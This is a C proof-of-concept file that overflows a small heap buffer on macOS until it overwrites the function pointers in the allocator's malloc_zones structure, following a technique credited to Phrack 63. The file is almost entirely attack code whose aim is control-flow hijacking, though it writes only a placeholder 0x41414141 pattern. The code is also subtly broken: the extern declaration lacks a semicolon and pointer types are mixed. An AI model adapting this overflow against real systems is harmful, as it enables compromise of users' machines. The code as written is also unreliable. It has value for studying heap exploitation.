// mac-heap.c
// Using techniques from Phrack 63 http://phrack.org/issues/63/5.html#article
// by nemo <nemo@felinemenace.org>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern unsigned* malloc_zones //malloc zone pointer

int main(int argc, char** argv)
{
   // define two pointers for buffers-one will be small the other large
   char* p1 = NULL;
   char* p2 = NULL;
   unsigned* p3 = NULL; // pointer to overwrite function pointers in malloc_zones

   p1 = malloc(64); // allocate a little bit of memory < 500 bytes
   while (p2 < *malloc_zones) // keep going till we are past malloc_zones
      p2 = malloc(24576); // allocate a lot of memory > 16k

   // now that p2 is above the malloc_zones structure overwrite p1 till 
   // we have overwritten function pointers in malloc_zones
   p3 = p1;
   while (p3 < (*malloc_zones + 48)) // overwrite malloc_zones plus a bit
   {
      *p3++ = 0x41414141 + (p3 - *malloc_zones)%26 * (0x01010101);  
   }

   free(p1);
   free(p2);

   return 0;

}
 
